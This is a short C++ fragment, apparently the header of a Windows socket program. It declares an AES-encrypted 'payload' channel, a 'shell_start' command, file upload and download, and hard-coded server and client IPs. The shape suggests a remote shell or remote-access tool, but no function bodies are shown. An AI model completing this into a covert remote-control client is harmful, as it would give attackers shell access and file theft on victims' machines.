#include <iostream>
#include <sstream>
#include <string>
#include <winsock2.h>  
#include <thread>
#include "aes.h"

#define SERVER_PORT 54321
#define CLIENT_PORT 8888
#define SERVER_IP "192.168.124.1"
#define CLIENT_IP "192.168.124.233"
#define BUFFER_SIZE 4096
#define FILE_SIZE	1024
#define SHELL_START "shell_start"

using namespace std;

typedef struct _FILE_DATA {
	int sec_index;
	int sec_count;
	int sec_length;
}FILE_DATA, * PFILE_DATA;

SOCKET g_client_socket;
AES_CONTEXT g_aes_ctx;
bool g_ondownload;
string g_srcfile, g_dstfile;
static void proc_output();
void file_download();
void file_upload();

void send_data(const char* data_buf, size_t data_len = 0); 
size_t recv_data(shared_ptr<char[]>& buf_data);
void encrypt_payload(const char* original_buf, char* encrypt_buf, UINT buf_len);
void decrypt_payload(shared_ptr<char[]> buf_data, UINT buf_len);
bool check_download(string download_str);
bool check_upload(string upload_str);
void refresh();